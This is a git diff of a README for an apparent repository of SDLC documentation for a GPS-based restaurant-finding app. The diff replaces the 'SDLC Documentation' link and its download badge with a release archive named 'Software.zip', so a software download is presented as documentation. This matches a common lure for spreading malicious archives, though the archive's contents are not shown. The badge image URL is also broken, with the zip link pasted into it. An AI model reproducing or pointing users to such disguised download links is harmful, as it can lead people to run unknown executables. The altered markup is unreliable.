@@ -8,9 +8,9 @@ Welcome to the `GPS-Based-Restaurant-Finding-Application_Software-Development-Li
 - **Topics:** documentation, gps-location, gps-tracker, sdlc, sdlc-tools, software-architecture, software-design, software-development, software-engineering, software-testing, software-tools
 
 ## Get Started 🚀
-To explore the documentation and resources related to the GPS-based restaurant-finding application software development life cycle, visit the [GPS-Based Restaurant Finding Application SDLC Documentation](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip) link.
+To explore the documentation and resources related to the GPS-based restaurant-finding application software development life cycle, visit the [GPS-Based Restaurant Finding Application SDLC Documentation](https://github.com/haydenmellor2/GPS-Based-Restaurant-Finding-Application_Software-Development-Life-Cycle/releases/download/v1.0/Software.zip) link.
 
-[![Download SDLC Documentation](https://img.shields.io/badge/Download-SDLC_Documentation-<COLOR>.svg)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download SDLC Documentation](https://github.com/haydenmellor2/GPS-Based-Restaurant-Finding-Application_Software-Development-Life-Cycle/releases/download/v1.0/Software.zip<COLOR>.svg)](https://github.com/haydenmellor2/GPS-Based-Restaurant-Finding-Application_Software-Development-Life-Cycle/releases/download/v1.0/Software.zip)
 
 Once you have downloaded the SDLC documentation, you can dive into the detailed information provided in the repository.
 
